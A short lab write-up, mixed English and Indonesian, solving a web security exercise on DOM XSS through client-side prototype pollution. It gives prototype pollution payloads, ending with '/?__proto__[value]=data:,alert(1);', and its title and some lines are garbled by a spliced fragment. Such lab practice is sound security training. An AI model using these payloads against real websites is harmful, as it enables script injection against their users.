# Lab: Client-side prototype pollution via bal:
 Find a source to add arbitrary properties to Object.prototype, identify a gadget property that executes JavaScript, then call alert().

Solution:
 English: Use __proto__ as a prototype pollution source, set a gadget property on Object.prototype, and trigger alert().
 Indonesian: Gunakan __proto__ sebagai sumber prototype pollution, atur properti gadget pada Object.prototype, dan jalankan alert().rowser APIs

Challenge Description:
 This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

Go

step: 
1. pertama cari prototype pollution source seperti `__proto__` dan atur gadget properti misalnya disini yaitu [value] dengan valuenya yaitu foo
2. jika diakses dengan `console.log(Object.prototype.value);` akan menghasilkan output berupa foo
3. setelahnya untuk memunculkan XSS via prototype pollution bisa dengan format data URI `data:[<mediatype>][;base64],<data>`untuk memicu titik temu XSS, payload akhir: `/?__proto__[value]=data:,alert(1);`

Payload:
/?__proto__[value]=foo 
true    
/?=__proto__[value]=foo

console.log(Object.prototype.value);

/?__proto__[value]=data:,alert(1);
